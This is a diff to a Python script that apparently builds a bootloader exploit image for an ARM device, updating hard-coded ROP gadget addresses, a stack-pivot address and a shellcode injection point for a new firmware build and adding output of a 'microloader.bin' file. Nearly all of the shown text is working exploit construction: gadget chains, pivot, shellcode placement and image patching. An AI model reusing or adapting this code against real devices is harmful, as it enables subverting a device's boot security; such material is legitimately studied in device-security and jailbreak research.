@@ -3,16 +3,19 @@ import struct
 
 base = 0x4BD00000
 
-# 0x0000000000050132 : pop {r0, r1, r2, r3, r6, r7, pc}
-pop_r0_r1_r2_r3_r6_r7_pc = base + 0x50132|1
-# 0x0000000000018422 : pop {pc}
-pop_pc = base + 0x18422|1
-# 0x0000000000025e9a : blx r3 ; movs r0, #0 ; pop {r3, pc}
-blx_r3_pop_r3 = base + 0x25e9a|1
+# old         4bd50132 cf bd           pop        {r0,r1,r2,r3,r6,r7,pc}
 
-cache_func = 0x4BD24C90
 
-test = 0x4BD00177 # prints "Error, the pointer of pidme_data is NULL."
+# 4bd4a5e6 cf bd           pop        {r0,r1,r2,r3,r6,r7,pc}
+pop_r0_r1_r2_r3_r6_r7_pc = 0x4bd14340|1
+# 4bd17f1e 00 bd           pop        {pc}
+pop_pc =  0x4bd17f1e|1
+# 4bd0174a 98 47           blx        r3
+blx_r3_pop_r3 = 0x4bd2514a|1
+
+cache_func = 0x4bd23f40
+
+test = 0x4bd00176|1 # prints "Error, the pointer of pidme_data is NULL."
 
 inject_addr = 0x4BD5C000
 inject_sz = 0x1000
@@ -21,7 +24,7 @@ shellcode_addr = inject_addr + 0x100
 shellcode_sz = 0x200 # TODO: check size
 
 # ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
-pivot = 0x4BD43320
+pivot = 0x4bd3d320
 
 def main():
     with open(sys.argv[1], "rb") as fin:
@@ -71,6 +74,10 @@ def main():
     hdr += shellcode
 
     hdr += b"\x00" * (0x400 - len(hdr))
+
+    with open("microloader.bin", "wb") as fout:
+        fout.write(hdr)
+
     hdr += orig
 
     with open(sys.argv[3], "wb") as fout:
